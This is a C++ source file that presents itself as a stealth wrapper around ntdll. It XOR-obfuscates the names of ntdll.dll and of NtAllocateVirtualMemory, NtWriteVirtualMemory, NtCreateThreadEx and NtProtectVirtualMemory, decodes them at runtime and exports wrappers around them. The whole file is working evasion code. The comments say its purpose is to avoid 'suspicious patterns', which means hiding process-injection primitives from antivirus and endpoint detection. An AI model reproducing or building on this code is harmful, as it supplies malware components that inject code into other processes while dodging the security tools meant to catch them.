// syscalls.cpp - Stealth ntdll caller with string obfuscation
// Avoids suspicious patterns by using obfuscated function names

#include "syscalls.h"

#ifndef STATUS_NOT_IMPLEMENTED
#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)
#endif

// XOR key for string deobfuscation
#define XOR_KEY 0x5A

// Deobfuscate string at runtime
static void Deobfuscate(char* str, size_t len) {
    for (size_t i = 0; i < len; i++)
        str[i] ^= XOR_KEY;
}

// Function pointer typedefs
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PFN_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *PFN_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
typedef NTSTATUS (NTAPI *PFN_NtClose)(HANDLE);
typedef NTSTATUS (NTAPI *PFN_NtFreeVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

// Cached pointers
static HMODULE g_hNtdll = NULL;
static PFN_NtAllocateVirtualMemory pfn_Alloc = NULL;
static PFN_NtWriteVirtualMemory pfn_Write = NULL;
static PFN_NtCreateThreadEx pfn_Thread = NULL;
static PFN_NtClose pfn_Close = NULL;
static PFN_NtFreeVirtualMemory pfn_Free = NULL;
static PFN_NtProtectVirtualMemory pfn_Protect = NULL;

// Get ntdll handle without using string literal
static HMODULE GetNtdllHandle() {
    if (g_hNtdll) return g_hNtdll;
    
    // "ntdll.dll" XOR 0x5A (9 chars)
    char ntdll[] = {0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x00};
    Deobfuscate(ntdll, 9);
    
    g_hNtdll = GetModuleHandleA(ntdll);
    return g_hNtdll;
}

// Resolve function by obfuscated name
static FARPROC GetFunc(const char* obfName, size_t len) {
    HMODULE h = GetNtdllHandle();
    if (!h) return NULL;
    
    char name[64];
    if (len >= sizeof(name)) return NULL;
    
    memcpy(name, obfName, len + 1);
    Deobfuscate(name, len);
    
    return GetProcAddress(h, name);
}

// Initialize all function pointers
static BOOL InitFunctions() {
    if (pfn_Alloc) return TRUE;
    
    // Obfuscated function names (XOR 0x5A)
    // "NtAllocateVirtualMemory" (23 chars)
    char s1[] = {0x14,0x2E,0x1B,0x36,0x36,0x35,0x39,0x3B,0x2E,0x3F,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23,0x00};
    pfn_Alloc = (PFN_NtAllocateVirtualMemory)GetFunc(s1, 23);
    
    // "NtWriteVirtualMemory" (20 chars)
    char s2[] = {0x14,0x2E,0x0D,0x28,0x33,0x2E,0x3F,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23,0x00};
    pfn_Write = (PFN_NtWriteVirtualMemory)GetFunc(s2, 20);
    
    // "NtCreateThreadEx" (16 chars)
    char s3[] = {0x14,0x2E,0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0E,0x32,0x28,0x3F,0x3B,0x3E,0x1F,0x22,0x00};
    pfn_Thread = (PFN_NtCreateThreadEx)GetFunc(s3, 16);
    
    // "NtClose" (7 chars)
    char s4[] = {0x14,0x2E,0x19,0x36,0x35,0x29,0x3F,0x00};
    pfn_Close = (PFN_NtClose)GetFunc(s4, 7);
    
    // "NtFreeVirtualMemory" (19 chars)
    char s5[] = {0x14,0x2E,0x1C,0x28,0x3F,0x3F,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23,0x00};
    pfn_Free = (PFN_NtFreeVirtualMemory)GetFunc(s5, 19);
    
    // "NtProtectVirtualMemory" (22 chars)
    char s6[] = {0x14,0x2E,0x0A,0x28,0x35,0x2E,0x3F,0x39,0x2E,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23,0x00};
    pfn_Protect = (PFN_NtProtectVirtualMemory)GetFunc(s6, 22);
    
    return (pfn_Alloc && pfn_Thread && pfn_Close);
}

// Exported functions
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect)
{
    if (!InitFunctions() || !pfn_Alloc) return STATUS_PROCEDURE_NOT_FOUND;
    return pfn_Alloc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten)
{
    if (!InitFunctions() || !pfn_Write) return STATUS_PROCEDURE_NOT_FOUND;
    return pfn_Write(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument, IN ULONG CreateFlags,
    IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList)
{
    if (!InitFunctions() || !pfn_Thread) return STATUS_PROCEDURE_NOT_FOUND;
    return pfn_Thread(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
                      StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

EXTERN_C NTSTATUS NtClose(IN HANDLE Handle)
{
    if (!InitFunctions() || !pfn_Close) return STATUS_PROCEDURE_NOT_FOUND;
    return pfn_Close(Handle);
}

EXTERN_C NTSTATUS NtFreeVirtualMemory(
    IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG FreeType)
{
    if (!InitFunctions() || !pfn_Free) return STATUS_PROCEDURE_NOT_FOUND;
    return pfn_Free(ProcessHandle, BaseAddress, RegionSize, FreeType);
}

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect, OUT PULONG OldProtect)
{
    if (!InitFunctions() || !pfn_Protect) return STATUS_PROCEDURE_NOT_FOUND;
    return pfn_Protect(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

// Stub functions for compatibility
EXTERN_C NTSTATUS NtCreateProcess(OUT PHANDLE a, IN ACCESS_MASK b, IN POBJECT_ATTRIBUTES c,
    IN HANDLE d, IN BOOLEAN e, IN HANDLE f, IN HANDLE g, IN HANDLE h) { return STATUS_NOT_IMPLEMENTED; }
EXTERN_C NTSTATUS NtCreateSection(OUT PHANDLE a, IN ACCESS_MASK b, IN POBJECT_ATTRIBUTES c,
    IN PLARGE_INTEGER d, IN ULONG e, IN ULONG f, IN HANDLE g) { return STATUS_NOT_IMPLEMENTED; }
EXTERN_C NTSTATUS NtOpenFile(OUT PHANDLE a, IN ACCESS_MASK b, IN POBJECT_ATTRIBUTES c,
    OUT PIO_STATUS_BLOCK d, IN ULONG e, IN ULONG f) { return STATUS_NOT_IMPLEMENTED; }
